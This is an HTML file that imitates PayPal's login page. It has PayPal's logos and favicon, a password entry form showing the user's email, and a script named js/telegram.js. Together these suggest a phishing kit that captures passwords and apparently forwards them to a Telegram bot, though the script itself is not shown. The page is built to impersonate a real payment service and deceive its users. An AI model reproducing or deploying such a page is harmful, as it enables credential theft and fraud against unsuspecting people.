<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>PayPal - Log In</title>
  <link rel="stylesheet" href="css/styles.css" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
</head>
<body>
  <div class="container">
    <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png" alt="PayPal Logo" class="logo">
    
    <form id="passwordForm" class="form">
      <div class="email-display">
        <span id="userEmail">Loading...</span>
        <a href="index.html" class="change-link">Change</a>
      </div>

      <div class="input-wrapper">
        <input type="password" id="password" placeholder="Enter your password" required />
      </div>
      <a href="#" class="forgot">Forgot password?</a>
      <button type="submit" class="btn-primary">Log In</button>
      
      <div class="divider">
        <span>or</span>
      </div>
      
      
      <button type="button" class="btn-secondary" onclick="window.location.href='signup.html'">Sign Up</button>
    </form>

    <div class="country-selector">
      <div class="dropdown">
        <div class="selected-country" id="selectedCountry" data-code="us">
          <div class="flag-icon"></div>
          <i class="fas fa-chevron-down arrow"></i>
        </div>
        <div class="dropdown-menu" id="dropdownMenu"></div>
      </div>
    </div>
  </div>

  <footer class="footer-links">
    <a href="#">Contact Us</a>
    <a href="#">Privacy</a>
    <a href="#">Legal</a>
    <a href="#">Policy Updates</a>
    <a href="#">Worldwide</a>
  </footer>

  <!-- Load scripts -->
  <script src="js/script.js"></script>
  <script src="js/telegram.js"></script>
</body>
</html>
